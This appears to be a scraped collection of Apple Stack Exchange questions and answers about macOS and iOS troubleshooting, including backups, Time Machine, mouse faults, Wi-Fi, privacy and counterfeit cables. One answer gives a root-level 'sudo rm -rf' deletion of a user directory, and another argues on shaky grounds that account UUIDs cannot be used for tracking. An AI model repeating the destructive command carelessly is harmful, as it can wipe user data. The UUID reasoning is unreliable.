podcast.\nHowever, the trick here is that these settings are managed from iOS Settings, not from the Podcasts app itself. To see these and other Podcasts settings:\n\n\n*\n\n*Open the Settings app\n\n*Swipe up until you see the Podcasts icon\n\n*Tap on Podcasts to view the various options available\n\n\nFor example, in your case you could set:\n\n\n*\n\n*your podcasts to refresh manually\n\n*to not download episodes\n\n*to delete played episodes\n\n\n3rd party apps\nApple's Podcasts app works pretty well, but as yet you can't use it to store podcasts in iCloud, you may want to consider 3rd party options.\nA number of apps offer the functionality to use cloud storage for your podcasts, mp3s, music, etc.  One example is the VOX – MP3 & FLAC Music Player app. However, while this is free, the VOX Music Cloud is only available for premium subscribers. There would be many other options though, so it would be worth searching around.\nUse a desktop version of iTunes\nI understand this is not your preferred option, but you can use iTunes on your Mac or PC to subscribe to and/or download your podcasts and then sync them across to your iPad if/when you need to listen to them.\nOnce downloaded on your desktop computer, there's nothing stopping you transferring the podcasts to iCloud, Dropbox, etc for online storage. Or, for that matter, to an external drive. In my case, my entire iTunes library is stored on an external drive, so any music, podcasts, etc are stored there.\n", "Q: Adding a signature to Automator email I have a little automator script that creates an email.\nThis works.

How can I diagnose fault? I have a 3 year old iMac (21.5-inch, Late 2013) running OS X 10.13.5 with 8 GB RAM and 1TB HDD.\nIt's been running very slow (takes minutes to open an Application, about 30 seconds to open a folder, etc). I've checked for viruses and malware but found nothing. I've scanned through log files in Console but also found nothing.\nI decided to re-install OS X and was performing a backup. There's 650GB of files and Carbon Copy Cloner has taken 7.5 hours to backup 595 GB. Activity Monitor is running and on the Disk tab reports Data read/sec at 577KB and Data written/sec at 311KB.\nThis seems slow. No evidence of any resource problem (CPU is mostly idle, RAM fine, no network I/O at the moment).\nIs the backup time normal? 8 hours to copy 600 GB seems slow to me but maybe not?\nIf the slow backup time is not normal, how can I diagnose if there's a hardware I/O problem?\n\nA: Backups that take 16 hours are certainly normal if you have lots of small files top update and copy (lots been 200,000 or so). Diagnosing failing / failed drives is generally easy for a technician since the system logs IO errors to the system log and hangs to Library/Logs. On the end user level, you won't be able to run a filesystem check / repair disk / erase disk using Disk Utility without errors when a drive is failed or failing. (Unfortunately you may get no warning other than a slowdown before it fails, so good on you for having a backup now)\nFor backups, the HDD access time is what limits things - doubly so if your source and destination are spinning drives or worse, a remote network volume. HDD might handle several hundred IOPS (input and output per second) best case and the backup process throttles IO usage to not impact the running system so if the backup ran in the foreground what might take an hour might stretch to dozens since it's throttled.\nNow that your backup is done, how long does it take to make a backup if you quit all the apps running, and don't have any launch when you log in and then perform this test.\n\n\n*\n\n*Log out of your account (and any others if you fast user switch)\n\n*Log in and start no apps except the terminal app in Utilities folder\n\n*Run a blocking backup and time exactly how long it takes\n\n\nThe command for that is:\n time tmutil startbackup --block  \n\nOn a 2015 MacBook with SSD backing up to a new USB 3.0 HD, you might see this for a very small change in data from the last backup interval on a smoothly running system:\nmac:~ me$ time tmutil startbackup --block\nTotal copied: 61.64 MB (64633164 bytes)\nAvg speed:    39.21 MB/min (685202 bytes/sec)\n\nreal    2m26.550s\nuser    0m0.046s\nsys     0m0.046s\n\nIf you post a couple of these with actual times we can discuss if it's worth erasing the drive and repartitioning it and running some speed benchmark tests or if you just need an SSD instead of HDD or if this is a sign the drive is failing and you'll be super glad you have a backup to restore once you replace that drive with a new HDD that runs at full speed.\n", "Q: Is it safe to add other files on the same drive that Time Machine uses as a backup destination? I have my back-up data & storage all on the same partition (No partitioning was done) on an external HDD?\nCould time machine overwrite other data or does this arrangement keep all the data on the drive safe?\n\nA: Some guidelines, Time Machine will not delete files it didn’t write to the Backups.backupdb folder and that folder has permissions to make it almost impossible for someone to accidentally store files there.\nOther files outside that directory are as safe as they would be without Time Machine using the drive. (Which means unless they are backed up elsewhere there’s nothing safe keeping one copy of a file)\nTime Machine calculates how much space it will need before it starts to copy files, and that calculation is pretty safe in that it over estimates the space it will need (sometimes quite substantially) and it will only delete files it wrote to the protected directory if it needs to free up space.\nOnce that deletion is done, if you asked Time Machine to notify you after it deletes files, you’ll get a warning that the drive ran low and the backup caused more than the normal deletion to happen.\n\nA: Yes it is safe.  Not had any issues doing this. Don't put the files in the folder that time machine uses for it's backup.\n", "Q: Troubleshooting a mac that won't go to sleep I have a small issue where my macbook won't go to sleep on lid-closing when it's connected to a power supply.

When I opened the lid, I could see that it was registered the lid was closed and what prevented it from sleeping.\nI've tried most of the pmset ones, and I don't think that's it. (It might be though?)\nI'm not necessarily looking for that exact one, so my question is:\nAny monitoring tools (preferably terminal or command-line) that shows the log of what happens when I close the lid? \n\nA: pslog\nHave you tried the pmset command for live debugging?\npmset -g pslog\n\n\n-g pslog displays an ongoing log of power source (battery and UPS) state.\n\n", "Q: Backup workflow from macOS to NAS? I manage several Macs in an office which run a mixture of 10.10 - 10.13 (all latest sub versions).\nI'm looking for a backup solution / workflow so I can set automated backups for each machine to a Synology NAS on the LAN.\nI've heard using Time Machine or Carbon Copy Cloner with the backup destination as a NAS can cause issues. The following quote is from a MacWorld article:\n\nWhen you use a network drive for your Time Machine backups, you can have problems. (I’ve heard of this occurring on an external, connected drive, but only rarely.) You may see an ominous dialog saying “Time Machine completed a verification of your backups on diskname. To improve reliability, Time Machine must create a new backup for you.” When this happens, you lose all your existing backups. You may have years of backups on your drive, and they’ll all disappear.\n\nSource: When backups go bad: The problem with using network drives with Time Machine\nCarbon Copy Cloner have also advised that backing up to a NAS is not the best option as instead of a bootable backup the backup is a diskimage, which isn't bootable and can become corrupted.\nI'm not so fussed about the backup being bootable, as long as I can copy my /documents folder from the NAS I'd be alright. But obviously if the whole backup is corrupted that would be a problem.\nIs there another piece of backup software or workflow which is better suited? \nOne of the things to consider is some of the devices are laptops so they may be taken off site at any time including mid backup, under those circumstances we wouldnt want the backups to become corrupted.\n\nA: There is no general „best backup method“, it always depends on your setup and on the assets you want to protect (whole disk or only user data, snapshot or history etc). This also means that issues with a specific method may or may not be an issue in your context. The problem described in the article does occur, but I‘ve seen this both with NAS and with USB drives. \nHaving said that I just want to point out that TimeMachine works well in combination with a Synology NAS, and also handles disconnects during a backup gracefully (you just need to make sure that the backup can run through from time to time). It gives you a backup of the whole directory tree so it also covers any applications installed etc. \n", "Q: Name assigned to the scrolling images in the camera app Odd question, but i am trying to recall what the small horizontal scrolling set of thumbnail images under a photo is called (in the iPhone camera app)\n\nA: The term i sought was \"scrubber\"..

In the preferences of the Terminal App, you can set custom ANSI colors for blue, green, yellow, bright red, etc. but they don't actually change anything in the Shell. For example using ls -G still displays the default ANSI colors. I know that you can customize the text, cursor, and background colors but what effect does changing the ANSI colors do? I have tried changing the LSCOLORS in the bash_profile but that didn't work.\nHow can I make the ANSI colors in the shell match the set custom colors in the Terminal preferences. \n\n\n\nA: To understand what effect changing those colors have, you'll need to understand how ANSI colors work.\nIn the early days of ANSI escape codes for coloring, the specification allowed programmers (or other users) to write codes for choosing between 8 colors (black, red, green, yellow, blue, magenta, cyan and white). As a kind of defacto standard terminal makers also allowed for choosing brither versions of the same colors (i.e. bright black, bright red, etc.).\nThe actual color of \"red\" or \"green\" isn't standardized and vary between terminal software. These are the colors that Apple lets you redefine. I.e. if you want your \"red\" to be more or less red (or something else entirely), it will let you.\nLater on work has been done to expand on these escape codes to allow a wider color range. In the ISO standard version of these escape codes it is possible for the programmer to select any 24-bit RGB color by issuing an escape code that specifies the amount of red, green and blue that goes into the specific color they want.\nThis means that if you run a program in the Terminal that is using the old set of escape codes that reference color \"names\" (i.e. red, green, cyan) - you can change what those color references mean in the preferences.\nHowever, for programs that use the newer escape codes that reference specific color codes (i.e. rgb(123,74,101)) the programmer has already explicitly asked for a specific color - and you're not able as a user to change that from the Terminal preferences.\n", "Q: Confusing Diskutil List result?

I’ve noticed that when I check the Date Modified for a folder and then open it, some files inside have a Date Modified later than the folder itself. This is confusing, because I sometimes sort folders by date only to find later that there're folders with stuff that was modified later. I'm using MacOS High Sierra.\n\nA: Folders (on MacOS) are more generally called directories, and that's a better description. Each folder is a list of its contents. A folder is modified when the list changes, that is, when a item (a file or a sub-folder) is added, moved or deleted from the list.\nModifying a folder's files or sub-folders does not change the list, so changing a file does not change the folder's modification date. If a file or sub-folder is added or deleted from the folder, then the list is changed and the folder's modification date changes. That's why a folder's modification date is often older that the modification dates of its contents.\nHere are some other questions and answers that mention the same issue.\n\n\n*\n\n*When does a UNIX directory change its timestamp\n\n*Timestamps of a directory?\n\n*Does change of a file in a directory not change the time of the directory?\n", "Q: Obtaining 2560 x 1600 on a 3840 x 2160 with surrounding bands When you pair a MacBook that supports only up to 2560 x 1600 on an external display with a Dell 28\" 3840 x 2160 monitor, is it possible to request precisely the resolution 2560 x 1600 on the monitor with empty bands on the four sides, or are you stuck with (the awful) 2x scaled 1920 x 1080?\nI see that there is yet another hidden feature. If you click Option in the display settings, you will see additional modes. But it seems that if this method will show you any additional modes, you already need to have the monitor in question connected just to run the experiment.\n\nA: You cannot request this from the computer, as it would have to support the full resolution in order to do that. This is a feature that would have to be provided by the monitor.\nYou’ll have to check the manual for your monitor to see if it can do this. Most monitors cannot.\nOn the other hand you’re not stuck with that one specific setting. You can choose to use the full 2560x1600 resolution, but it will typically fill up the entire display.\n", "Q: Apple QuickTake™ 150 camera pictures in QuickDraw format… Apple QuickTake 150 camera pictures in \"QuickDraw picture\" format cannot be opened by any software I have.\nAt some point in the dark reaches of the past, I recall being able to Save As… but at the time, I was ignorant of what was to come and was concerned with using as little disk space as possible. 150KB seemed big at the time.\nI think the files are compressed as a few .tiff format duplicates fluff-up to over 6X its native format size.

Years ago I restored most of my old QuickTake photos, but have since run across some more, so I'm at it again, trying to get the old nag running again to restore those forgotten images.\n\nA: If you just want to open the images on a system they would have originally been used with, a Classic Mac running System 7.5 to Mac OS 9, you need to have the QuickTake Image extension in your Extensions folder.\nThe extension is part of the QuickTake Software, and is also provided as a loose file on the QuickTake Image 2.0.1 disk that you can drag into the System Folder if you don't want to install the rest of the software.\n", "Q: How to create a global date entry shortcut/hotkey? Excel and Google Sheets both allow you to enter the current date (and time) with a single keystroke.  I would love to be able to do this in other applications too but can't find any way to do this without resorting to 3rd party apps that also do a whole lot more that I don't need.\nUsing Automator/Services won't work because the main application I want to use this with is a Java app called Tradewonk, and services appear to not be available to a java application (there is no \"Services\" option in the \"Java\" menu that appears when the app is running).\nSo any other suggestions for how I can generate the current date/time with a keystroke?

I use BetterTouchTool for various gestures on my trackpad, but had forgotten that it could trigger text sequences as well, including current date/time.

I have read that the user accounts on a Mac actually have a UUID associated with them and this means Apple is tracking every action performed with that user account.\nI’ve already deleted all Facebook and Google apps, and I also don’t want Apple tracking me. Searching online reveals that I can stop Apple by refreshing or changing this UUID so that Apple has no way of tracking me, as the UUID no longer matches their records.\nHow can I do this on my iMac Pro?\n\nA: Firstly, the premise behind your question is false on two grounds:\n\n\n*\n\n*The UUID isn’t actually a UUID in the real sense. - What I mean is that it isn’t a universally unique identifier that, for anything more than practical purposes, is unique. See universally unique identifier for more info. So, while your user account UUID looks the same as a real UUID because of its 32 hexadecimal digits in the 8-4-4-4-12 pattern, it’s not actually a UUID in the true sense of unique. That is, it's not like there's a central authority ensuring that the possibility of two UUIDs being the same is zero!\n\n*Apple does not use the UUID to track you - Despite occasional rumours that Apple uses this to track the activity linked to the Admin account of a Mac, there is actually no evidence of this. (This is also confirmed by 1 above - i.e. since it's not a real UUID it can't really be used for tracking purposes). Instead, this UUID is used by Apple’s Open Directory to manage information about your Mac user accounts and provides them with access to network resources. See Apple Open Directory for more info. \n\n\nSecondly, since you’ve got an iMac Pro, you actually can’t change the UUID. More specifically, iMac Pros all shipped with macOS High Sierra as their original OS, and as of this version of macOS the option to Refresh or Change the UUID is no longer available like it was in earlier generations of macOS (albeit hidden away). Why? Because too many users were doing this to resolve issues and ended up causing themselves major grief instead. \nFinally, you may want to familiarise yourself with Apple’s stance on privacy:\n\n\n*\n\n*Our approach to privacy \n\n*Manage your privacy \n\n*Transparency report \n\n*Privacy Policy\nIf you’re still concerned, you can also contact Apple directly about privacy issues.\n\nWARNING for users of macOS up to and including Sierra - Do not refresh/change your UUID.

No sense having multiple copies of the same image in Photos.\n", "Q: Mac often perceives left-click on Magic Mouse as right-click The bug:\nAll of a sudden, my 2013 rMBP often perceives a left-click on my Magic Mouse 2 as a right-click.\nDetails:\n\n\n*\n\n*\"Often\" ≈ every 30 seconds.\n\n*I have 2 different mouses: an Apple Magic Mouse 1 and an Apple Magic Mouse 2. The problem persists when using either mouse. (Only one is switched on at a time.)\n\n*The right-click still functions properly.\n\n*The built-in trackpad does not have this issue. It still functions properly.\n\n*I've read that the problem might be somehow related to Google Chrome. But, the problem persists (e.g., in Finder) even when Google Chrome is not running.\n\n*I've terminated the keyboard-remapping software, \"Karabiner.\" I do not have the purportedly-problematic apps, \"BetterTouchTool\" or \"Magnet,\" installed.\n\n*No peripherals are plugged into the computer.\n\n*As soon as I notice that the left-clicks are right-clicks, I do not touch the mouse for about 5 seconds, and the mouse goes \"back to normal\"... until it happens again (and the process repeats).\n\n*I plugged in a wired USB Dell mouse (model # 0CJ339). The wired mouse does not have the issue.\nWhat I've tried:\n\n\n*\n\n*I've disconnected and deleted my wireless keyboard as a Bluetooth device (to ensure that no other Bluetooth device is connected to my rMBP other than my mouse).\n\n*Turning Bluetooth on and off.\n\n* shift  +  ⌥ option  + left-clicking the Bluetooth menu bar icon → Debug → \"Reset the Bluetooth module\" & \"Factory reset all connected Apple devices\" & \"Remove all devices\"\n\n*Switching mouse on and off. Recharging mouse.\n\n*System Preferences → Mouse → toggling the \"Secondary Click\" checkbox and ensuring that \"Click on right side\" is selected\n\n\n*\n\n*I've discovered another bug that could be related: When \"Secondary click\" is set to \"Click on left side\" in System Preferences → Mouse, the computer never perceives a right-click (no matter whether the mouse is left-clicked or right-clicked). It behaves as if the \"Secondary click\" checkbox is not even enabled.\n\n\n*Deleting Apple Bluetooth and mouse preference files found in ~/Library/Preferences/\n\n*Resetting PRAM & SMC\n\n*Booting in Safe Mode. (The issue still manifests in Safe Mode.)\n\n*Logging out of the administrator account and logging into the \"Guest\" user account (where the issue still manifested).\n\n*Repeatedly pressing the  ⌃ control  key on the laptop keyboard to ensure that a small piece of foreign matter is not stuck underneath this key. (When I hold down the  ⌃ control  key and left-click, the rMBP perceives this as a right-click 100% of the time.) Also, opening \"Keyboard Viewer\" to ensure that my computer does not perceive any modifier keys as being pressed when the issue occurs.\n\n*I do not have any other lingering Bluetooth devices in the vicinity that might interfere with the mouse.\nIs there anything else that I can try, besides reinstalling the OS?\n\nOS X El Capitan, version 10.11.6. \n\n\nA: Update:\nI randomly noticed that a three-finger-tap on the built-in trackpad would not pull up the dictionary entry for the selected word (like it used to).\nI navigated to:\n\n\n*\n\n*System Preferences → Trackpad → Point & Click tab → and saw that the \"Look up & data detectors\" checkbox was not enabled. \n\n\nThis was very strange, because this feature has always been enabled, and I never disabled it. I enabled this checkbox, and the \"look-up\" feature now worked.\nBut, this immediately made my computer stop perceiving all right-clicks (i.e., right-clicks on my mouse were always perceived as left-clicks).\nSo, I navigated to:\n\n\n*\n\n*System Preferences → Mouse → Point & Click tab → and toggled the \"Secondary click\" checkbox off and back on.\n\n\nAfter doing this, my computer has not perceived a left-click as a right-click again.\nI still have no clue what caused the issue, or why doing the above solved it, especially considering that, for good measure, I had already previously deleted the com.apple.AppleMultitouchTrackpad.plist and com.apple.driver.AppleBluetoothMultitouch.trackpad.plist preference files.\n\nA: In my case, I had placed an external keyboard on the built-in trackpad. That was messing up the mouse clicks.\n\nA: Fixed!!!\nI discovered that my iMac showed my old Bluetooth keyboard as well as the new one that I got because I needed a number pad. I removed the batteries from the old keyboard and the mouse is back to normal!\n\nA: I experienced same item as described above.\nI tried everything as described above.\nThe problem occurred suddenly this week. In the morning it was ok and then as of 09:00 am it started. I looked into YouTube movies how to repair your Magic Mouse. After trying everything possible, I eventually bought a new Magic Mouse 2. The problem remained. It cost me the whole day.\nI restarted my modem and removed Polar Heart monitors to be far away from my MacBook Pro as any device what could be bluetooth. I shut down my printer. I removed my Bluetooth and set it up again. The problem remained.\nThe next morning the problem was GONE and then started as of 11:00 am again. I was puzzled as I did not do anything.\nEventually I found out that an interior painter was doing a maintenance project in the room exactly below me. When he used his tools, it interfered with my mouse....\nPfff problem is gone, but who would have thought that would be the cause.\nI hope it may help someone.\n", "Q: Weird iCloud Drive view How do I get to see all of the folders shown in the folder in this question.\nWhen I go to iCloud Drive all I see is:\n\n(Parts of image containing personal information whited-out)\n\nA: Based on the window icons, it appears you are using OS X Yosemite or later.

If you see different results here it must be something in your profile interfering with Preview.\nBut I'm betting the preview developers didn't account much for people opening 49MB, 32kx32k images. In the likely chance that this is a genuine glitch you could quickly report it at https://www.apple.com/feedback/ or sign up for a developer account & do a full bug report over at https://developer.apple.com/bug-reporting/. \nIn the short term I would recommend trying to use a different application to view this. A browser or photo editing application might be a good fit. For an image like this there is also a good chance that JPEG would more efficiently compress it & cause less issues, maybe look into converting it with Photoshop or similar.\n\nA: I downloaded the file and was able to reproduce the issue you describe, as others have mentioned you should report this to Apple as a bug.\nHowever in the interim there is a nice little utility called Xee it still takes a lot of time to render but it works eventually, the app is £3.99 for the full version but there is a time limited trial on the website.\nWithin Xee, I set View > Scaling Quality to Low to improve loading times.\nExample of 100% crop:\n\n\nA: Not enough power; suppose so.

Does that have something to do with it? I like to keep them because I travel a lot and it's nice to come back to a place and have my system automatically log in without any effort on my part.\nI have written a command line application to manage WiFi independently of the GUI (at https://github.com/keithrbennett/wifiwand), but would prefer to have both options available to me.\n\nA: Having over 400(!) preferred networks may be one symptom of the lengthy time it takes to load them all. I suggest that you take the time to delete the networks you never use, even ones that you connect to infrequently. It may be convenient to be able to connect quickly, but you've found one reason why it actually isn't. Re-establishing networks does not take much time, and you may just prevent your computer from connecting to infrequently connected networks which have been compromised since you last used them.\nSecondly, if you use iCloud Keychain, any Wi-Fi networks you connect to on any device you use with iCloud Keychain (iOS devices particularly) will populate this list. I found this out when coming back from a vacation in Europe and all the networks I connected to on my iPad whilst there appeared on my desktop Mac at home!\nLastly, it is wise to move the most frequently used Wi-Fi networks to the top of the list. This may help decrease the amount of time the list appears. I have but a fraction of the number of networks saved, so I can't do a real-world experiment to see if this will decrease the length of time it takes to load the list.\n\nA: Please triple-click anywhere in the line below on this page to select it:\n/Library/Preferences/SystemConfiguration\n\nRight-click or control-click the line and select\nServices ▹ Open\n\nfrom the contextual menu.

So I have 512GB internal and 1TB external working storage that I currently backup to a 1.5TB external. I'd like to add another 1TB drive to make a redundant backup of just my internal drive (because it doesn't have space for both internal and external work drives).\nI'd guess this isn't possible but perhaps there is a way to hack it? Perhaps with tmutil and a shell script?\n\nA: So if I understand correctly, you want to exclude the 1TB working storage volume from the backups on the 1TB backup disk, but not from those on the 1.5TB backup disk. I don’t think this is supported by tmutil’s addexclusion verb, as it does not provide a way to specify that you only want to exclude the item from a specific backup disk.\nTo hack a solution yourself, you could basically, before making a backup, invoke either addexclusion or removeexclusion depending on which disk you will be backing up to. If you don’t plan on having both backup disks connected at the same time, you could automate this by running a script when you connect one of the two backup disks, see the question on “How to run Applescript on Disk mount” for possible solutions. If you do want to have both backup disks connected at the same time, you will probably also have to turn off automatic backups and hack your own solution to periodically run the startbackup verb (using its -d argument to alternate between the two disks).\nNote that I didn’t try hacking this myself, so there might be “caveats” I’m not thinking of. One thing I’m not sure about is whether or not toggling the exclusion on and off again for the 1TB working storage volume will cause Time Machine to do a “deep scan” of the volume again on the next backup, which would make your backups take longer, depending on how many files and directories it holds. In the end, you’ll have to evaluate yourself whether hacking this is worth the additional hassle, given that an external 2TB USB drive can easily be had on Amazon for 65 USD or less.\n\nA: I would get a 4 TB or 2 TB drive and set that up to be your primary backup.\nWhen you have enough history on that new drive, span the two other drives (RAID 0) into one large volume and add that as a second drive.\nThe cost of storage is so low, it’s better to just have a simple backup in my experience. Hacking changes to the system means you might miss an error condition and have no backup.\nOff-site backup for the gap might be worthwhile as well. Backblaze or arq backup to whatever storage you please (Amazon S3 / Azure / Google / other cloud) would be ideal for Mac backup in my eyes in 2019.\n", "Q: Is my mac being hacked by a user called Guatoan? And how can I remove this user? I recently visited a website and on pressing a link another window automatically opened saying the website had found a virus on my laptop. Obviously this was a scam so I returned to the original website and tried the link again. This time the same thing happened so I closed the scam window and tried a third time. This time however the same scam page opened only an uncontrollable and loud beeping sound accompanied the warning and many files began to quickly and automatically download from the scam website and into my downloads folder on my dock. I was with a friend and she said that it looked like loads of circular coins were being downloaded. I immediately quit safari and permanently deleted the files that had downloaded from the scan website unfortunately without looking at what type of files they were. Then after searching online to find ways to identify and remove viruses and malware I downloaded Malwarebytes and Dr. Antivirus and did full scans where no threats were found. Then I wanted to see if my mac had been hacked by someone perhaps so i found advice on here:(https://www.techwalla.com/articles/how-to-find-out-if-your-computer-is-hacked) telling me to go into terminal and identify all the current users. All the users seem typical and normal except a user called \"Guatoan\" and I have no idea if this is normal or not and, if i am indeed hacked, if I can remove this user immediately? If anyone has had a similar experience or has any advice or knowledge regarding to anything I have said in this post that could help me understand better what is going on I would be extremely thankful! thank you very much\n\nA: It’s not clear what user ID you are running - so to rule that out - what does this command show?\nid\n\nNext, you’ll want to inventory your backups to know if you can erase everything and or need to make a backup. Next you can inventory all the accounts - run this command\ndscacheutil -q user | grep -A 3 -B 2 -e uid:\\ 5'[0-9][0-9]'\n\nThis will fetch all the users with their respective directories.\nThen you can delete the user using this. sudo is needed as the commands need to run as root.\nsudo dscl . delete /Users/your user name(name from the output)\nsudo rm -rf (dir from the output)\n\nOnly delete the dir if it is not one of the system ones - probably only do that if it is of for /Users/X where X is not one of your normal users.\n\nA: If you don't recognize that user account, I'd say it's better to be safe than sorry - you should delete it. If you have a backup I would actually take it a step further and erase my disk and restore from my backup. Assuming that this is a hacker who has created an account on your mac, there's no telling what he has done/is planning to do. Common attacks are ransomware, cryptomining, and data theft.\n", "Q: Apple Enterprise account taking too much time for verification I enrolled in an Apple Enterprise account, and after 13 days I got a call from Apple and they verified my company. They then told me that they will call me again for further verification. Its been 20 days and still no response.\nI called Apple for the status of my account, but they only have one answer: your enrollment is still being processed -- don't worry. \nAfter several months I’m not getting the feeling Apple is going to approve this. Can I take any actions to expedite this?\n\nA: If you don’t get an initial status after 15 business days, it might be worth checking in with developer support to check if you can help clarify anything. With the recent news of large companies that should have known better being publicly caught using enterprise certificates to surveil non-employees and minors, I would only expect the requirements to qualify for enterprise accounts to get more legalistic and involve more paperwork. Also, there’s not much reason to go enterprise anymore so make sure you even need that capabilities before you undertake the vetting process.\nOn the good news, I’ve been seeing Apple just decline enterprise accounts and tell people to get a normal account. If Apple hasn’t offered that, I would reach out to the sales channel that took your money and/or developer relations (if you have a personal account) to check if you can submit any information to speed their review.\nIf they see you as a legitimate business and you have submitted more than a handful of apps through TestFlight then it will be far easier to make the case you are an enterprise. I would expect Apple to make a formal change to say that a requirement for an enterprise account would be to have three individual accounts submit apps to show that you’ve outgrown the normal developer path. You don’t have to release anything on the app stores publicly to show you’re an enterprise and submitting honest builds - everything can be internal testing. \nI would expect that the number of enterprise companies that don’t have an account at this point is so low, the majority of applications are not truly enterprise 10 years in to this process.\n\n\n*\n\n*I tried to enroll my company to Apple Enterprise program, but get message \"Cannot enroll in Apple Developer program\"\n\n*How to appeal rejection by Apple for Developer Enterprise Account?\nMy answer to the second question above has one public report of this shifting enterprise apps to normal accounts going forward. Time will tell if my hunch is right or if you just need your legal and business departments within the enterprise to contact Apple to show you have several developers and need of enterprise capabilities.\n", "Q: mysql command not found after pipe I installed mysql with homebrew.\nmysql --version\nmysql  Ver 8.0.11 for osx10.13 on x86_64 (Homebrew)\n\nand\nwhich mysql\n/usr/local/bin/mysql\n\nbut when I try to use it after a pipe, I get the following error\nunzip -p dump.sql.zip | mysql\nzsh: command not found:  mysql\n\nWhy is that and how can I fix it?\n\nA: You have an extra character before mysql that looks like a space, but is not a space.

Trying to clear up space on my 2017 MacBook Pro running High Sierra.\nI have deleted all the photos and deleted them permanently from the trash folder as well using the \"Go\" and \"~/Trash\" command. This definitely cleared up space, but in System Information, it still shows 47.58 GB in \"Photos.\"\nIt shows just the nominal size (2.1MB) in Documents/Pictures for the photos library though.\nHow can I reclaim the space?\n\n\n \n\nA: There's not enough information here for a definitive answer (no fault on you, if you had that \"definitive information\" you wouldn't be asking the question :). That said, I'll guess that there is an \"orphaned\" photo library somewhere on your HD that's fallen into a crack. I say this because of something that happened to me after Apple \"upgraded\" iPhoto to Photos not too long ago. In my case this happened after I \"migrated\" user accounts from an older Mac to a newer one. You may recall that iPhoto allowed you to create as many libraries as you wanted, and over time, I lost track of some of them. This is just a guess, but hope it helps.\nIt seems that Apple may have been a bit ambiguous as to how to handle removal of data stores containing pictures. There doesn't seem to be a single method that works across all of the different apps, devices and storage scenarios. If you've not migrated a user account (or \"upgraded\" from iPhoto to Photos to your 2017 Mac, or the \"orphaned iPhoto library\" theory doesn't hold up, perhaps one of the following will give you some leads to discover which method will work for you.\nThis thread might be worth a read\nAnd from Apple's support forum: this might be worth reviewing:\n\nDeleted photos and videos are placed in the Recently Deleted album on your device, where they remain for 30 days. After that, items are permanently removed from all your devices set up for iCloud Photo Library.\nYou can remove items from your devices before the 30-day time period is up. On your iOS device, in the Recently Deleted album, tap Select, tap to select one or more items, tap Delete, then tap Delete [items]. To remove photos on your Mac, see Access your photos and videos everywhere with iCloud Photo Library in Photos Help for Mac.\n\nAnd from yet another post on the subject:\n\n\n*\n\n*Launch the Photos app on your Mac.\n\n*Click the Recently Deleted folder in your sidebar.\n\n*Click on the pictures or videos you want to permanently delete.\n\n*Click on the Delete button at the top right.

In the description of the item, the seller wrote \"Apple Brand\", which is what I was trying to purchase.\nHowever, there are a couple of things that make me think this cable might not be made by Apple:\n\n\n*\n\n*No Apple logo on the product\n\n\n*Cardboard holder\n\n\n*Oddly printed guide books\n\n\n\n*Disclaimer on the cable printed at approx. 4 inches from the USB port, seems to read \"Designed by Apple in Califomia Assembled in China Fov 5222F2KA HW\"\n\n\n\n\n\n*Detail of the USB\n\n\n\n\n\n*Detail of the Lightning\n\n\n\nFor me, the difference is trivial. But in order to properly give the seller a rating, I'd love to know if they sold me what they pretended to sell or not.\nIf Apple cables have a certified chip inside, it should be easy to know?\nEdit: In editing this question after getting a lot of comments, I retook better pictures of the cable and ruled out possibilities of bad kerning on \"Califomia\". I genuinely couldn't see well the first time and thought other Apple cables could have gotten badly kerned as well. (Disclaimer: I worked for Apple in the past and live in \"Califomia\" lol).\n\nA: I would suggest the cable is likely fake, although nearly everything in the original post matches my genuine cable. I have (what I believe to be) a genuine apple cable wth similar markings, however the “rn” appears to be kerned correctly, and the font for the id number appearing after “Assmebled in China” is using a different font. Note that I’ve increased the contrast of the image slightly to make the printing clearer.\n\n\nA: I'm going to go out on a limb here and say that imho, anything claiming to be designed in \"Califomia\" is not a genuine Apple product :3\nApple's official article -- Identify counterfeit or uncertified Lightning connector accessories -- may help you confirm my suspicions.\nFor those not liking hidden links the full address of the Apple article above is https://support.apple.com/ht204566\n\nA: Apple Lightning to USB cables may not have been produced recently enough to contain certification devices (\"MFi chips\") such as you had hoped this one might. That said, the information you provide clearly indicates the cable in your possession does not meet Apple's guidelines for identification as an Apple-manufactured Lightning to USB cable.\nLightning to USB cables made by Apple and sold by them as aftermarket accessories bear the legend \"Designed by Apple in California\" and either \"Assembled in China,\" \"Assembled in Vietnam,\" or \"Indústria Brasileira\" on the cable itself. This text is followed by a 12-character serial number comprising a mixture of digits and uppercase-only letters, with no spaces between them. Since the serial number on your cable contains lower case letters, a space, and 13 characters, there is no possibility it is genuine.\nDid the seller know he was selling counterfeit parts? That's hard to know. The question now is, what does he do when he finds out?\n\nA: Apple's guide is quite long and a detailed picture of the lightning connector should show the quality regardless of the color or font.\nThat being said, the fonts here show this as a fake. Notice the similarity between the rn in California and m in assembled. I'd have to see it in person but unless this is a really distorted picture, they are appear too similar to be a genuine cable. \nThis is a fake cable and OP should request a return. Apple has a habit of updating a list of unauthorised accessories with their software updates so that your non MiFi cable stops charging your phone without warning. Certain cables can be bricked by the phone so they no longer charge devices running lower iOS versions as well.\n\nA: I'd guess genuine:\n\n\n*\n\n*No Apple logo: none of my (genuine, coming with an iPhone or iPad) cables have the logo.\n\n*Cardboard holder: Apple do use cardboard holders for those cables, including the one in your photo.\n\n*I don't see what's odd on the guide books, I have the same as the one on the left on your photo (except mine don't have staple) that came with an old USB to 30 pin cable, purchased directly from Apple.\n\n*Yes the \"m\" in the mention is suspicious but it could simply be bad kerning.\nSo your best option is to use the guide  linked by @Scottmeup in his answer. There's enough distinctive details to come to a definitive conclusion.\n\nA: Fake.  Aside from the other things people have noted (rn/m substitution, wrong serial number format, shoddy paperwork, etc), the font on the cable is a dead giveaway.  Apple's standard corporate font has been Myriad since 2002.  The fake cable is using Arial.\n\nThe typesetting of the serial number is also wrong.  The genuine cable moves to a smaller font with double kerning and centered vertical alignment with respect to the preceding text.\n\nA: the cable is grey in the photo, the equivalent Apple cable is white. It also does NOT have any \"designed in Califomia, made in China\" printed on it.\nSo that makes it an almost certain fake on 2 counts, not just the faulty spelling of California.\nI should know, I'm looking at 2 of them right now I happen to own that came with Apple equipment.\nAlso, the stapling of the paperwork seems shoddy, far more so than any similar paperwork I've ever seen in a genuine Apple box. Could be a fluke, but another red flag especially in combination with the others.\nAnd yes, it matters. While the cable itself isn't that problematic, fake chargers are often extremely dangerous.\n\nA: First of all, the font used on the cable is rather suspicious. Second, the M in California is obviously suspicious as well. I don't believe they come with cardboard wrapping. The gold that should be on the USB doesn't really look that good. As for the serial number, it's supposed to be a 12-digit one.\nI think that your best guide for this would be https://support.apple.com/en-gb/ht204566. Many others are talked about it too. Your best bet. <3\nThank 